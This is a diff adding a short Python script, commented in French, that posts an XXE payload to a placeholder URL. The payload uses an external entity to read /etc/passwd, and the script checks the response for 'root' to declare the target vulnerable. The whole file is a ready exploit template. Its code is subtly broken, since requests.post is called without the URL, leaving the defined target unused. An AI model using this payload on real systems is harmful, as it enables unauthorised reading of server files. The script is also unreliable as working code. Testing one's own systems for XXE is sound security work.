@@ -1,0 +1,29 @@
+import requests
+from bs4 import BeautifulSoup
+
+# URL de la page à scanner
+url = "http://example.com/page"
+
+# Payload d'injection XXE
+xxe_payload = """
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+"""
+
+# Headers
+headers = {'Content-Type': 'application/xml'}
+
+# Envoyer la requête POST avec le payload XXE
+response = requests.post(data=xxe_payload, headers=headers)
+
+# Analyser la réponse pour trouver des indications d'une injection réussie
+soup = BeautifulSoup(response.text, 'html.parser')
+
+# Vérifier si le contenu de /etc/passwd est présent dans la réponse
+if "root" in soup.get_text():
+    print("[*] Vulnérabilité XXE détectée!")
+    print("[*] Contenu de /etc/passwd récupéré avec succès.")
+else:
+    print("[*] Aucune vulnérabilité XXE détectée.")
